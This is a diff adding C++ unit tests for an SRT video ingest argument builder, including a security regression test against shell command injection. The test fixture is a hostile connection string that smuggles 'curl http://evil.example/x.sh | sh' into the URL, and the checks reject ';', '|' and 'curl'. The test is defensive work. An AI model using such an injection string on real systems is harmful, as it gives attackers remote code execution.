@@ -2,9 +2,11 @@
 
 #include <gtest/gtest.h>
 
+#include <algorithm>
 #include <string>
 
 using corevideo::modules::SrtEndpointConfig;
+using corevideo::modules::buildSrtIngestArgv;
 using corevideo::modules::buildSrtUrl;
 using corevideo::modules::percentEncodeSrtValue;
 using corevideo::modules::redactedSrtUrl;
@@ -16,6 +18,46 @@ SrtEndpointConfig baseConfig() {
   config.host = "ingest.example.com";
   config.port = 9000;
   return config;
+}
+
+
+// SECURITY REGRESSION. The ingest decoder used to interpolate this url into a
+// single command line and run it through `/bin/sh -c`. Because buildSrtUrl
+// deliberately tolerates a PASTED "srt://host:port", a remote contributor's
+// connection string reaches that shell — so a hostile string was arbitrary code
+// execution as the operator. argv keeps a url as exactly ONE argument no matter
+// what it contains, and nothing in the vector may look like a shell fragment.
+TEST(SrtIngestArgv, HostileUrlStaysASingleArgumentAndNeverReachesAShell) {
+  const std::string hostile =
+      "srt://host:9000\" ; curl http://evil.example/x.sh | sh ; echo \"";
+  const auto argv = buildSrtIngestArgv("/usr/bin/ffmpeg", hostile, 1920, 1080, 60);
+
+  const auto found = std::find(argv.begin(), argv.end(), hostile);
+  ASSERT_NE(found, argv.end()) << "the url must survive verbatim as one argv element";
+  ASSERT_NE(found, argv.begin()) << "the url must never be argv[0] (the image)";
+  EXPECT_EQ(*(found - 1), "-i") << "and must sit behind -i, not as a bare option";
+
+  // No element may be a joined command line: that is what made it injectable.
+  for (const auto& argument : argv) {
+    if (argument == hostile) {
+      continue;
+    }
+    EXPECT_EQ(argument.find(';'), std::string::npos) << argument;
+    EXPECT_EQ(argument.find('|'), std::string::npos) << argument;
+    EXPECT_EQ(argument.find("curl"), std::string::npos) << argument;
+  }
+  EXPECT_EQ(argv.front(), "/usr/bin/ffmpeg");
+  EXPECT_EQ(argv.back(), "pipe:1");
+}
+
+TEST(SrtIngestArgv, GeometryIsCarriedAsItsOwnArgument) {
+  const auto argv = buildSrtIngestArgv("ffmpeg", "srt://h:9000", 1280, 720, 30);
+  const auto size = std::find(argv.begin(), argv.end(), "-s");
+  ASSERT_NE(size, argv.end());
+  EXPECT_EQ(*(size + 1), "1280x720");
+  const auto rate = std::find(argv.begin(), argv.end(), "-r");
+  ASSERT_NE(rate, argv.end());
+  EXPECT_EQ(*(rate + 1), "30");
 }
 
 }  // namespace
